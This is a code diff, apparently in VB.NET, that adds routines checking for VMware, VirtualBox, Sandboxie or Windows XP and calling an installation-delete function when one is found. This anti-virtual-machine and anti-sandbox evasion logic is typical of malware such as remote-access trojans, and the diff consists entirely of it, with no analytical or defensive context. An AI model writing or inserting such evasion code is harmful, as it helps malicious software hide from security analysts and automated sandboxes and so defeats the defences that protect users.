@@ -22,5 +22,30 @@
         Return a.ToArray
     End Function
 
+    Sub VMware()
+        On Error Resume Next
+        If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
+            Installation.DEL()
+        End If
+    End Sub
 
+    Sub Virtualbox()
+        On Error Resume Next
+        If IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
+            Installation.DEL()
+        End If
+    End Sub
+
+    Sub Sandboxie()
+        On Error Resume Next
+        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
+            Installation.DEL()
+        End If
+    End Sub
+
+    Sub Win_XP()
+        If ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
+            Installation.DEL()
+        End If
+    End Sub
 End Module
